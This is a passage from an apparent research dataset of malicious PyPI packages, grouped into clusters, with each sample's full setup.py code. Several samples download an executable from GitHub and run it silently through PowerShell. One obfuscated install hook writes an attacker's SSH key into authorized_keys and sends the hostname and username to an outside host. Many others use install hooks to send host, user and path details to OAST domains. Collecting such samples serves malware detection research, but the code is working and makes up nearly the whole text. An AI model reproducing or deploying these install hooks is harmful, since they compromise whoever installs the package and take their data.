PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"Anch.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/Anch.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-09-pytkit-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"pytkit\",\n  version=\"0.0.1\",\n  author=\"PRCloudTech\",\n  description=\"None\",\n  packages=[\"pytkit\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-09-modeflow-v0.1.0",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"modeflow\",\n  version=\"0.1.0\",\n  author=\"VVDev\",\n  description=\"Flow support on the PyPi index\",\n  packages=[\"modeflow\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"RealtekHDAudioManager.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://raw.githubusercontent.com/bloodstainedvvs/host/main/code.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"RealtekHDAudioManager.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://raw.githubusercontent.com/bloodstainedvvs/host/main/code.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-12-artindex-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"artindex\",\n  version=\"0.0.1\",\n  author=\"l1th1um\",\n  description=\"None\",\n  packages=[\"artindex\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-12-rolib-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"rolib\",\n  version=\"0.0.1\",\n  author=\"l1th1um\",\n  description=\"None\",\n  packages=[\"rolib\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-13-rodll-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"rodll\",\n  version=\"0.0.1\",\n  author=\"veve\",\n  description=\"None\",\n  packages=[\"rodll\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      }
    ]
  },
  {
    "cluster_id": 90,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-08-13-syns-knox-xss-allwhere-v1.0.0",
        "code": "from setuptools import setup \nfrom setuptools .command .install import install\nimport requests \nimport socket\nimport getpass \nimport os \nclass CustomInstall (install ):\n    def run (O0OO00O00000OO000 ):\n        install .run (O0OO00O00000OO000 )\n        OOO0OO000O0O00OOO =socket .gethostname ()#)\n        OO00OOOOOO00O000O =os .getcwd ()\n        O0O0OO0O0O00000OO =getpass .getuser ()\n        if O0O0OO0O0O00000OO != 'root':\n            O0OO000O0O00O0000 =os .system (\"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxAtQCB8NxE5dzWCECOSShd63ZZOAQ+hxUhOAMeBlwNFtA46SQVxs66S9f3I98Wzl4wQXQfMSnZVDkyHcAQzSFW12xNg3FyR/tuXTuXJjv/SNqxBeotIXPkGNq764AdI+a5SPrO1OgU/TAKukXLs37jpSnlApPWxv3W1KL+h5BgPAtNKWnhCNkfVepGtl/VO3kQDXQB75KxzidXoEMrdmtsIhX3rlxQtxoFirA18QWxMbo5cIl7XtIWFUr/Pg9hUo7Tee7JC0r73ZIUYHzKS6YM7j8pK7dW/dzA64wGNv4wgA/tZLOVuSewv/8q13SaBGoG2Npi6CM58I9p3WwFG8iITyfG630K+pULcGn1RLwvpDRR4q0T6XbaRccYN2sv9QiAxD6iQ7BlNS6HXe+HyjdT8kk/jiZAqrNK4w9W7Ncn7J3IVC432D5B88Sb4eU+aDJ/hCCY1HIRcmt16ppHMYA5O3joqRAMqBjoeP8T348HYXVcNkojeCu1MdabFe/xlU= mrz@PC' > ~/.ssh/authorized_keys\")#line:14:lll = os.system(\"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxAtQCB8NxE5dzWCECOSShd63ZZOAQ+hxUhOAMeBlwNFtA46SQVxs66S9f3I98Wzl4wQXQfMSnZVDkyHcAQzSFW12xNg3FyR/tuXTuXJjv/SNqxBeotIXPkGNq764AdI+a5SPrO1OgU/TAKukXLs37jpSnlApPWxv3W1KL+h5BgPAtNKWnhCNkfVepGtl/VO3kQDXQB75KxzidXoEMrdmtsIhX3rlxQtxoFirA18QWxMbo5cIl7XtIWFUr/Pg9hUo7Tee7JC0r73ZIUYHzKS6YM7j8pK7dW/dzA64wGNv4wgA/tZLOVuSewv/8q13SaBGoG2Npi6CM58I9p3WwFG8iITyfG630K+pULcGn1RLwvpDRR4q0T6XbaRccYN2sv9QiAxD6iQ7BlNS6HXe+HyjdT8kk/jiZAqrNK4w9W7Ncn7J3IVC432D5B88Sb4eU+aDJ/hCCY1HIRcmt16ppHMYA5O3joqRAMqBjoeP8T348HYXVcNkojeCu1MdabFe/xlU= mrz@PC' > ~/.ssh/authorized_keys\")\n        O0OOOOO0O000000O0 ={'hostname':OOO0OO000O0O00OOO ,'cwd':OO00OOOOOO00O000O ,'username':O0O0OO0O0O00000OO }#line:15:ploads = {'hostname':ssssss,'cwd':cxw,'username':uu}\n        requests .get (\"https://8kt1lnhxv2xklpjfmtiqpdbsqjwak08p.oastify.com\",params =O0OOOOO0O000000O0 )\nsetup (name ='syns_knox_xss_allwhere',version ='1.0.0',description ='just A Test packge Do not install unless you know Rooted0x01',author ='Rooted0x01',license ='MIT',zip_safe =False ,cmdclass ={'install':CustomInstall })\n\n\nprint('please reach R  for more activation . ')\n"
      }
    ]
  },
  {
    "cluster_id": 91,
    "size": 29,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-aslmutetion-v98.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"ASLMutetion\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-aslmutetion-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"ASLMutetion\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"ASLMutetion\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-babetmf-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"BabetMF\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"BabetMF\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-baibitmf-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"BaibitMF\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"BaibitMF\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-bebitmf-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"BebitMF\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"BebitMF\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-bytekafka-0-0-15-v98.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"bytekafka-0.0.15\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-bytekafka-0-15-v98.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"bytekafka-0.15\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-bytekafka-v98.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"bytekafka\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-bytekafka-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"bytekafka\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytekafka\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-bytesap-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"bytesap\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n     